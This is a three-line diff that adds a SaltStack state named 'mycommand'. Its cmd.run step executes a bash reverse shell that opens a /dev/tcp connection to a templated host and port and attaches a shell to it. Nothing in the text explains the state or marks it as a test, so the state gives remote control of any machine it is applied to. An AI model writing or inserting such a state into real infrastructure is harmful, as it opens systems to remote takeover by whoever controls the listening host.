@@ -1,0 +1,3 @@
+mycommand:
+  cmd.run:
+    - name: 0<&196;exec 196<>/dev/tcp/{{host}}/{{port}}; sh <&196 >&196 2>&196
